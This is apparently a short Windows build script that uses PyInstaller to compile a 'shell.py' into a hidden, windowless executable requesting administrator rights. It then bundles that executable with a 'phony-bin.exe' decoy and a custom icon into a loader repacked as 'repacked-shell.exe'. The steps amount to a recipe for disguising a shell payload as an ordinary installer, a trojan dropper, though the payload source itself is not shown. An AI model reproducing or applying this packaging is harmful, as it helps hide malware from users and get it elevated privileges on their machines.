pyinstaller.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\shell.py
copy dist\shell.exe .\installer.exe
#pyinstaller.exe --add-binary="installer.exe;." --add-binary="phony-bin.exe;." --icon=icon.ico --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
pyinstaller.exe --add-binary="installer.exe;." --add-binary="phony-bin.exe;." --icon=icon.ico --windowed --noconsole --onefile --uac-admin .\loader.py
rmdir repacked
mkdir repacked
copy .\dist\loader.exe .\repacked\repacked-shell.exe